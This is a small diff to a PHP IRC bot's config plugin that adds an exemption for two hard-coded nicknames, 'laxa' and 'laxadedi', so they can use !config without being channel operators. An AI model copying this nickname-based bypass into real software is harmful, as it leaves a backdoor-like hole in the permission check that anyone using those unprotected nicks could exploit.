@@ -10,8 +10,11 @@ class CorePlugin_Config extends Plugin {
 	
 	function isTriggered() {
 		if($this->Channel !== false && $this->User->mode != '@' && $this->User->mode != '~' && $this->User->mode != '%') {
+                    if ($this->User->nick != 'laxa' && $this->User->nick != 'laxadedi')
+                    {
 			$this->reply('You have to be an operator in this channel to use !config.');
 			return;
+                    }
 		}
 		
 		if(!isset($this->data['text'])) {
